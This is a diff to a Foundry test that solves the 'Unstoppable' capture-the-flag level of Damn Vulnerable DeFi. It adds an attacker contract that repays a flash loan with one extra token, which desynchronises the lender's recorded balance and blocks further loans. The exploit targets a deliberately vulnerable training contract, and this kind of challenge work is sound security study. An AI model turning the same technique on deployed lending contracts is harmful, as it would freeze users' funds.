@@ -8,6 +8,11 @@ import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
 import {UnstoppableLender} from "../../../src/Contracts/unstoppable/UnstoppableLender.sol";
 import {ReceiverUnstoppable} from "../../../src/Contracts/unstoppable/ReceiverUnstoppable.sol";
 
+import {SafeERC20} from "openzeppelin-contracts/token/ERC20/utils/SafeERC20.sol";
+import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";
+
+
+
 contract Unstoppable is Test {
     uint256 internal constant TOKENS_IN_POOL = 1_000_000e18;
     uint256 internal constant INITIAL_ATTACKER_TOKEN_BALANCE = 100e18;
@@ -60,6 +65,12 @@ contract Unstoppable is Test {
         /**
          * EXPLOIT START *
          */
+        vm.startPrank(attacker);
+        ReceiverAttack receiverAttack = new ReceiverAttack( address(unstoppableLender));
+        dvt.transfer(address(receiverAttack), 1);
+        receiverAttack.executeFlashLoan(1);
+        vm.stopPrank();
+
         /**
          * EXPLOIT END *
          */
@@ -73,5 +84,24 @@ contract Unstoppable is Test {
         vm.startPrank(someUser);
         receiverUnstoppable.executeFlashLoan(10);
         vm.stopPrank();
+    }
+}
+
+contract ReceiverAttack {
+    using SafeERC20 for IERC20;
+
+    UnstoppableLender private immutable pool;
+
+    constructor(address poolAddress) {
+        pool = UnstoppableLender(poolAddress);
+    }
+
+    /// @dev Pool will call this function during the flash loan
+    function receiveTokens(address tokenAddress, uint256 amount) external {
+        IERC20(tokenAddress).safeTransfer(msg.sender, amount + 1);
+    }
+
+    function executeFlashLoan(uint256 amount) external {
+        pool.flashLoan(amount);
     }
 }
